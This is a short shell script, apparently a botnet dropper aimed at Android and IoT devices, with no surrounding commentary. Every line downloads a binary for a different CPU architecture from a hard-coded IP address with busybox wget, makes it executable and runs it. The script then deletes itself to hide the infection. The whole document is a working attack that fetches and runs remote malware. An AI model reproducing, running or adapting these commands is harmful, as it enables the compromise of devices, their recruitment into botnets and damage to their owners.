busybox wget http://45.95.146.126/arm; chmod 777 arm; ./arm android
busybox wget http://45.95.146.126/arm5; chmod 777 arm5; ./arm5 android
busybox wget http://45.95.146.126/arm6; chmod 777 arm6; ./arm6 android
busybox wget http://45.95.146.126/arm7; chmod 777 arm7; ./arm7 android
busybox wget http://45.95.146.126/sh4; chmod 777 sh4; ./sh4 android
busybox wget http://45.95.146.126/arc; chmod 777 arc; ./arc android
busybox wget http://45.95.146.126/mips; chmod 777 mips; ./mips android
busybox wget http://45.95.146.126/mipsl; chmod 777 mipsl; ./mipsl android
busybox wget http://45.95.146.126/spc; chmod 777 spc; ./spc android
busybox wget http://45.95.146.126/x86; chmod 777 x86; ./x86 android

rm $0